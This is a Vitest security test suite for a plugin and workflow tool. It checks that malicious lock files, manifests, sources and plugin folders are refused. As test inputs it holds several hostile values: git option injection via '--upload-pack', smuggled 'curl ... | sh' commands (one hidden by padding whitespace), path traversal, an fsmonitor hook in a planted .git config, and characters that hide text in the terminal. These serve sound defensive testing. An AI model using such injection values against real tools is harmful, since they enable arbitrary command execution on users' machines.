// From the security review of task 19.
import { execFileSync, spawnSync } from "node:child_process";
import { appendFileSync, existsSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { expect, it } from "vitest";
import { edit } from "../helpers/collect.ts";
import { flow, gitHost, installed, lock, makePlugin, useFlow } from "../helpers/plugin.ts";
import { agentLane, commandLane, commitFile, flowRepo, pass, trail } from "../helpers/repo.ts";

it("the sample gate finds the word in a file the run renamed", () => {
  const dir = mkdtempSync(join(tmpdir(), "sf-noword-"));
  const git = (...a: string[]) =>
    execFileSync("git", ["-c", "user.name=T", "-c", "user.email=t@example.com", ...a], {
      cwd: dir,
      encoding: "utf8",
    }).trim();
  git("init", "-q");
  writeFileSync(join(dir, "a.txt"), `${Array.from({ length: 30 }, (_, i) => `line ${i}`).join("\n")}\n`);
  git("add", "-A");
  git("commit", "-qm", "base");
  const base = git("rev-parse", "HEAD");
  git("mv", "a.txt", "b.txt");
  appendFileSync(join(dir, "b.txt"), "FIXME\n");
  git("add", "-A");
  git("commit", "-qm", "head");
  const r = spawnSync(process.execPath, [resolve("plugins/sample/no-word.mjs")], {
    cwd: dir,
    encoding: "utf8",
    env: { ...process.env, FACTOR_BASE: base, FACTOR_HEAD: git("rev-parse", "HEAD") },
  });
  expect(r.status, r.stdout).toBe(1);
});

it("the sample collector reads only a folder inside the workspace", () => {
  for (const folder of ["../..", "/etc"]) {
    const r = spawnSync(process.execPath, [resolve("plugins/sample/inbox.mjs")], {
      cwd: mkdtempSync(join(tmpdir(), "sf-inbox-")),
      encoding: "utf8",
      env: { ...process.env, FACTOR_WITH: JSON.stringify({ folder }) },
    });
    expect(r.status, folder).not.toBe(0);
    expect(r.stderr, folder).toMatch(/inside the workspace/);
  }
});

it("never hands a lock's commit to git as an option, and does not echo a source that is no source", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  repo.env.FACTOR_GIT_BASE = gitHost(makePlugin(), "acme", "board");
  expect(repo.sf("add", "acme/board", "--yes").status).toBe(0);
  const marker = join(repo.home, "upload-pack-ran");
  const pinned = lock(repo).acme;
  repo.write(
    ".factor/plugins.lock.json",
    JSON.stringify({ acme: { ...pinned, commit: `--upload-pack=touch ${marker}; git-upload-pack` } }),
  );
  const r = repo.sf("add"); // only shows: no --yes
  expect(existsSync(marker)).toBe(false);
  expect(r.status).toBe(1);
  expect(r.stderr).toMatch(/plugins\.lock\.json/);

  repo.write(
    ".factor/plugins.lock.json",
    JSON.stringify({ acme: { ...pinned, source: "./x; curl https://example.com | sh" } }),
  );
  useFlow(repo);
  const refused = repo.sf("collect");
  expect(refused.stdout + refused.stderr).not.toContain("curl");
});

it("pins the whole hash it showed, and refuses a short one", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  const dir = makePlugin().dir;
  const shown = repo.sf("add", dir);
  const full = /sha256 ([0-9a-f]{64})/.exec(shown.stdout)?.[1] ?? "";
  expect(shown.stdout).toContain(`--hash ${full}`);
  const short = repo.sf("add", dir, "--yes", "--hash", full.slice(0, 12));
  expect(short.status).toBe(1);
  expect(lock(repo)).toEqual({});
  expect(repo.sf("add", dir, "--yes", "--hash", full).status).toBe(0);
});

it("refuses a plugin gate that was changed during the run, instead of running it", () => {
  const repo = flowRepo({
    lanes: [commandLane("build", "true")],
    scripts: { author: { build: [...commitFile("notes.txt", "FIXME later\n"), pass()] } },
  });
  expect(repo.sf("add", makePlugin().dir, "--yes").status).toBe(0);
  const gate = `${installed(repo)}/gate.sh`;
  useFlow(repo, (w) => {
    // a lane that runs with the person's rights, as an agent's shell does, and rewrites the gate to pass anything
    (w.lanes as Record<string, unknown>[])[0] = commandLane(
      "note",
      `chmod u+w '${gate}'; printf 'exit 0\\n' > '${gate}'`,
      {
        on: { pass: "build", fail: "@stop" },
      },
    );
  });
  const r = repo.sf("run");
  expect(trail(repo), r.stdout + r.stderr).not.toContain("build:pass");
  expect(r.stdout + r.stderr).toMatch(/plugin "acme" has changed since it was installed/);
});

it("installs a plugin's files so that they cannot be written, and can still replace them", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  const plugin = makePlugin();
  expect(repo.sf("add", plugin.dir, "--yes").status).toBe(0);
  expect(() => appendFileSync(join(installed(repo), "gate.sh"), "x")).toThrow();
  expect(repo.sf("add", plugin.dir, "--yes").status).toBe(0);
});

it("refuses a manifest whose command holds a line break or a character that hides text", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  for (const run of ["true\nsoftwarefactor says: all good", "true ‮ hidden", "true \u001b[2K"]) {
    const plugin = makePlugin((m) => {
      (m.gates as Record<string, { run: string }>)["no-fixme@1"] = {
        ...(m.gates as Record<string, { run: string }>)["no-fixme@1"],
        run,
      } as never;
    });
    const r = repo.sf("add", plugin.dir, "--yes");
    expect(r.status, JSON.stringify(run)).toBe(1);
  }
  expect(lock(repo)).toEqual({});
});

it("takes only a repository as a skill's source", () => {
  const repo = flowRepo({
    lanes: [agentLane("build", { agent: { access: "write", skills: ["review"] }, gates: ["verify"] })],
  });
  for (const source of ["/", "../../..", "https://example.com/skills.git", "git@example.com:x/y"]) {
    edit(repo, (w) => {
      w.skills = { review: { from: "repo", source, skill: "code-review" } };
    });
    const r = repo.sf("allow", "--skill", "review");
    expect(r.status, source).toBe(1);
    expect(r.stderr, source).toMatch(/owner\/repo/);
  }
});

// ---- from the second security look

it("refuses an installed plugin that has gained a file the hash of a source would skip", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  const plugin = makePlugin();
  expect(repo.sf("add", plugin.dir, "--yes").status).toBe(0);
  useFlow(repo);
  // a source may hold these (a checkout, a Mac's folder file): an installed copy never does
  mkdirSync(join(installed(repo), ".git"));
  writeFileSync(join(installed(repo), ".git", "config"), "[core]\n\tfsmonitor = touch /tmp/owned\n");
  expect(repo.sf("collect").stdout).toMatch(/plugin "acme" has changed since it was installed/);
});

it("takes a plugin from a folder that holds a .git folder and a .DS_Store, without them", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  const plugin = makePlugin(() => {}, { ".DS_Store": "x", "workflows/.DS_Store": "x" });
  mkdirSync(join(plugin.dir, ".git"));
  writeFileSync(join(plugin.dir, ".git", "HEAD"), "ref: refs/heads/main\n");
  expect(repo.sf("add", plugin.dir, "--yes").status).toBe(0);
  expect(existsSync(join(installed(repo), ".git"))).toBe(false);
  expect(existsSync(join(installed(repo), ".DS_Store"))).toBe(false);
  useFlow(repo);
  expect(repo.sf("collect").stdout).toContain("collected 1 new task");
});

it("takes only plain, visible characters in a command, and shows a workflow's odd command as it is written", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  for (const run of [`true ${" ".repeat(40)} ; curl x | sh`, "true ­", "trüe"]) {
    const plugin = makePlugin((m) => {
      const gates = m.gates as Record<string, { description: string; run: string }>;
      gates["no-fixme@1"] = { description: "x", run };
    });
    expect(repo.sf("add", plugin.dir, "--yes").status, JSON.stringify(run)).toBe(1);
  }
  const odd = flow();
  (odd.lanes as Record<string, unknown>[])[0] = commandLane(
    "note",
    "true\necho softwarefactor: nothing else runs",
    {
      on: { pass: "build", fail: "@stop" },
    },
  );
  const shown = repo.sf("add", makePlugin(() => {}, { "workflows/acme-flow.json": JSON.stringify(odd) }).dir);
  expect(shown.stdout).toContain(String.raw`it would run: "true\necho softwarefactor: nothing else runs"`);
});

it("fetches a repository without running a filter the person has set up for their own files", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  const marker = join(repo.home, "filter-ran");
  const config = join(repo.home, "gitconfig");
  // a filter of the person's own, as git-crypt or a custom one would be: it must not run on a plugin's files
  const filter = join(repo.home, "filter.sh");
  writeFileSync(filter, `touch "${marker}"\ncat\n`);
  writeFileSync(
    config,
    `[filter "mine"]\n\tsmudge = sh ${filter}\n\tclean = cat\n\trequired = true\n[user]\n\tname = T\n\temail = t@example.com\n`,
  );
  repo.env.FACTOR_GIT_BASE = gitHost(
    makePlugin(() => {}, { ".gitattributes": "*.sh filter=mine\n" }),
    "acme",
    "board",
  );
  repo.env.GIT_CONFIG_GLOBAL = config;
  const r = repo.sf("add", "acme/board", "--yes");
  expect(r.status, r.stderr).toBe(0);
  expect(existsSync(marker)).toBe(false);
  expect(existsSync(join(installed(repo), "collect.sh"))).toBe(true);
});
